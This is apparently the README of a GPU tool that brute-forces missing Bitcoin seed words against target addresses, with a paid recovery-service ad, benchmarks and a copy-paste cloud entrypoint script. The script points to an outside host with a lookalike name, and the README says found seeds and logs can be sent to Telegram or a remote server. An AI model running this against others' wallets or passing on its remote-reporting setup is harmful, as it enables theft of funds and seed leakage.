

<img width="817" height="305" alt="image" src="https://github.com/user-attachments/assets/a46029e5-18d9-4d67-af77-a154078fe7d6" />

- 🧬 Bruno da Silva — Security Researcher | Blockchain & Cryptography
- 📧 bsbruno@proton.me
- 📱 +55 11 99740‑2197

- GitHub: ipsbruno | ipsbrunoreserva | ipsbruno3
- Pastebin: ipsBruno | Drakins

# 🥇 Bitcoin Recovery Services

We provide assisted wallet seed and password recovery for users who have lost access to their funds, for a **fixed fee of $1,000**.

Our key differentiator is **non-custodial support**: at no point do **we ask for your seed phrase or take control of your wallet**. Instead, we guide you step-by-step on how to install and use the tools, and how to set up your own recovery rig in the safety of your own home, without trusting third parties.

We develop specialized software and hardware for mass seed searching.

_In very specific cases, its possible we can recover up to 6 words missing the 12 seeds, if cost are not restrictive_

**Contact:** bsbruno@proton.me

On this GitHub, you’ll find some of the most optimized codebases for seed searches, including highly parallelizable software implementations and open-source hardware/ASIC designs used across the recovery industry.

Thank you at all

---
### ⚠️ This project is intended **exclusively** for **lawful** recovery of wallets owned by the user. Unauthorized use against third‑party wallets is strictly prohibited.
---


# ⚡ Bitcoin Seed Recovery (GPU)

## 📌 Quick overview
This project performs **GPU‑accelerated mnemonic recovery** (BIP‑39 and Electrum) via OpenCL. The focus is recovering phrases with **missing words** and comparing the first derived address against a target list (bc1 Bech32 addresses).

**Real‑world performance (current optimizations):**
- 🚀 **RTX 5090**: ~**1,000,000 KHash/s**  in optimized pipelines.
- 💻 **RTX 4070 Laptop**: ~**150.000 KHash/s**.

> These figures depend on driver, clocks, power limits, and mode (Electrum vs BIP‑39). See benchmarks below for more context.

---

## 🧠 Processing flow (high level)
1. **Input (Python host)**
   - Reads a target address file (`addresses.txt`) (one address per line)
2. **OpenCL kernel**
   - Generates 12‑word candidates from `(memHigh, memLow)`.
   - Derives the first address (BIP‑84 or Electrum, depending on mode).
   - Compares against targets and writes hits to a buffer.
3. **Output (Python host)**
   - Reconstructs the found mnemonic and saves to `encontrados.txt`.
   - Updates UI and state (`state.json`).


---

## Internet  Services

``
This code connects to the internet to coordinate and retrieve recovery logs, allows you to remove or download telegram.py and cloudflare.py if you need a bus offline and secure locally, without access to external services
``

**Telegram Support:**

<img width="1563" height="762" alt="image" src="https://github.com/user-attachments/assets/6909f83a-f3ac-4771-974f-245e088aa03c" />

You have the ```telegram.py``` file which allows you to send benchmark logs and hit results (seeds found) via Telegram. This facilitates notification of new finds and granular control of the operation; simply use the functions in the main file ```main.py```

## Vast.AI Containers

**Vast.ai** has hundreds of high-end GPUs available for cheap rent; for around $100 you can recover your keys for **up to 4 missing seeds in a few hours**. If you wish, create an NVIDIA CUDA template with the following entrypoint in the settings:

This will allow the instance to run permanently searching for your lost keys.

````

#!/usr/bin/env bash
set -euo pipefail


REPO="${REPO:-bitcoin_cracking_final}"
URL="https://github.com/ipsbruno3/${REPO}.git"
mkdir -p /workspace
cd /workspace
python3 -m pip install --no-cache-dir -U pip >/dev/null 2>&1 || true
python3 -m pip install --no-cache-dir numpy pyopencl python-dotenv mnemonic rich rbloom requests bech32 >/dev/null
command -v supervisord >/dev/null 2>&1 || python3 -m pip install --no-cache-dir supervisor >/dev/null
if [ -d ".git" ]; then
  git pull --rebase --autostash || true
else
  rm -rf ./* 2>/dev/null || true
  git clone --depth 1 "$URL" .
fi
cat > /workspace/addresses.txt <<'EOF'
address
address
address
address
address
address
address
address
address
address
EOF
cat > /workspace/.env <<EOF
SLOT_API_URL=https://gpu.cloudfralelink.me
GPU_THREADS=10_000_000
RANDOM=1
CLOUDFLARE_TOKEN=BRUNO
EOF

cat > /workspace/supervisord.conf <<'EOF'
[supervisord]
nodaemon=true

[program:app]
command=/usr/bin/python3 -u /workspace/main.py
directory=/workspace
autorestart=true
startsecs=2
stopasgroup=true
killasgroup=true
stdout_logfile=/workspace/app.log
stderr_logfile=/workspace/app.err
EOF

exec supervisord -c /workspace/supervisord.conf
````

# Dashboards UI/UX

In the ````cloudflare.py```` file, you have the requests used to send data to the server. This server receives the hashrate and stores benchmark results. If you wish to configure it, this allows you to create a dashboard with logs and real-time results of your search for private keys.


<img width="1885" height="1035" alt="image" src="https://github.com/user-attachments/assets/1e941637-cdb8-4418-982b-895e9dc667f6" />

_The dashboard code is not available in this repository. If you want it, send me an email and I can make it available._


It removes ```cloudflare.py``` and ```telegram.py``` if you want to run the code locally without internet access.

We recommend running it on a ```12xRTX NVIDIA 5090``` rig locally if there are many funds involved, for your own security; in this configuration, 5 words can be recovered for up to 3 years.

---

### Rich UI Console

<img width="502" height="665" alt="image" src="https://github.com/user-attachments/assets/f66b4292-1752-49fc-881e-30d3a55868cc" />

---

## ✅ Requirements
- Linux + recent NVIDIA driver (OpenCL runtime is included with the driver)
- Python 3.10+

---

## ⚙️ Installation (Linux)

```bash
sudo apt update
sudo apt install -y nvidia-driver-550 ocl-icd-libopencl1 clinfo

python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
```

**requirements.txt**
```
pyopencl
mnemonic
bech32
python-dotenv
numpy
rich
```

---



## 🔧 Configuration (.env)

| Variable | Description | Default |
|---------|-------------|---------|
| `SEED` | Partial mnemonic. Use `?` for missing words. | **required** |
| `GPU_THREADS` | Total threads per kernel batch. | `32000` |
| `SAVE_PROGRESS` | Save state to `state.json` (0/1). | `1` |
| `RANDOM` | If `1`, randomizes search (non‑sequential). | `0` |
| `ELECTRUM_SEED` | If 1, this turns on Electrum’s seed‑version pre‑filter and adjusts checksum behavior. | `0` |
---


---

## 🔀 How to enable random search
In `.env`, set:
```env
RANDOM=1
```
This makes the loop pick random blocks of the search space instead of a sequential sweep.


## 📝 I have a partial word in seed
If you have a few letters from one of the seed words, our cracker lets you use wildcards, for example: `seed seed ?aba ? abandon abandon abandon ? abandon`.

The cracker will then search for words that start with **"aba"** using a **combinational** search strategy. It’s about **25% slower**, but it can reduce your search space by **tens to hundreds of times**.

Another interesting thing is that the Total space will be calculated based on exactly how many words and possible combinations you have, making it the most perfect automatic calculator available. If you have partial portions of your seed, it will calculate exactly how much search space you have.

## 🚀 Running

```bash
python3 main.py
```

The script will:
- Detect GPU via OpenCL
- Compile/load kernel with cache
- Load `addresses.txt`
- Start brute‑forcing

---

## 🧪 Key optimizations (based on the code)

### ⚡ 1. Bit‑level pipeline and on‑device checksum
- 128‑bit seed representation (`memHigh` + `memLow`) avoids string work.
- Expands to ASCII only when needed for HMAC.

### ⚡ 2. 64‑bit PBKDF2/HMAC/SHA512
- SHA‑512 uses native `ulong`, reducing instruction count.
- Pre‑formatted HMAC blocks avoid dynamic loops.

### ⚡ 3. Electrum pre‑filter (seed version)
- Invalid seeds are discarded **before** PBKDF2.

### ⚡ 4. Optimized secp256k1 ECC
- Windowed 8-bit NAF multiply and specialized modular reduction.

### ⚡ 5. Direct address set lookup
- In‑memory set lookup avoids costly string conversions.

---

## 📊 Benchmarks (comparison)

### Electrum (addr/s)
| GPU | Throughput |
|-----|-----------|
| RTX 6000 PRO | **72,000,000** |
| RTX 5090 | **69,000,000** |
| RTX 4090 | **40,000,000** |
| RTX 5080 | **35,000,000** |
| RTX 5070 | **23,000,000** |
| RTX 3090 | **23,000,000** |
| RTX 5060 Ti | **15,000,000** |
| RTX 3070 | **12,000,000** |
| RTX 2080 Ti | **10,000,000** |

### BIP‑39 (seeds/s)
| GPU | Throughput |
|-----|-----------|
| RTX 5090 | **1,000,000** |
| RTX 5080 | **600,000** |
| RTX 4070 Laptop | **150,000** |

---

## 🛠️ Usage tips
- **Best case:** missing words at the end (kernel sweeps low bits first).
- **Pause/resume:** `SAVE_PROGRESS=1` writes `state.json`.
- **Use a small, precise address set** to reduce false positives.

---

## ❓ Quick troubleshooting

### OpenCL not found
```bash
sudo apt install -y nvidia-driver-550 ocl-icd-libopencl1 clinfo
clinfo | head -n 20
```

### Select a specific GPU
```bash
main.py 1 
```
For GPU 1

### Build failing (CL_BUILD_PROGRAM_FAILURE)
- Check `kernel/*.cl`.
- Rebuild without cache: delete `kernel/cache/*.clbin`.

---

## 📦 Fast install (copy & paste)
```bash
sudo apt install git
git clone https://github.com/ipsbruno3/bitcoin_cracking_final/
cd bitcoin_cracking_final
sudo apt update
sudo apt install -y nvidia-driver-550 ocl-icd-libopencl1 clinfo
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
python -m pip install -U numpy pyopencl python-dotenv mnemonic rich
python main.py
```











